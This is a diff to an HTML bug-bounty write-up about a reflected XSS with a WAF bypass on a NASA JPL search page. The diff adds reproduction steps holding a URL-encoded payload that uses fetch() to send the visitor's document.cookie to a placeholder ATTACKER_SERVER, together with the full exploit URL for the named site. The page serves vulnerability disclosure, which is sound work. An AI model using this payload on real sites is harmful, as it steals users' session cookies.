@@ -73,6 +73,18 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration.png" alt="Final Exploit">
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration Request.png" alt="Exfiltration Request">
 
+    <h2>✅ Steps To Reproduce</h2>
+    <ol>
+      <li>Start a public web server (we used Serveo exposing a Python localhost server for this).</li>
+      <li>Replace <code>ATTACKER_SERVER</code> with the URL generated for you:
+        <pre><code>pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
+      </li>
+      <li>Visit the URL:
+        <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
+      </li>
+    </ol>
+    <p>You'll receive a request with your <code>cookies</code> appended. You can try with another person to prove it's working.</p>
+
     <h2>📜 Official Recognition</h2>
     <div class="pdf-container">
       <iframe src="/assets/others/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf#toolbar=0&navpanes=0&scrollbar=0" width="100%" height="100%" style="border: none;"></iframe>
@@ -146,7 +158,7 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
             <strong>Severity</strong>
           </div>
         </div>
-        <div class="meta-badge badge badge-p3">Medium</div>
+        <div class="meta-badge medium">Medium</div>
       </div>
     </div>
 
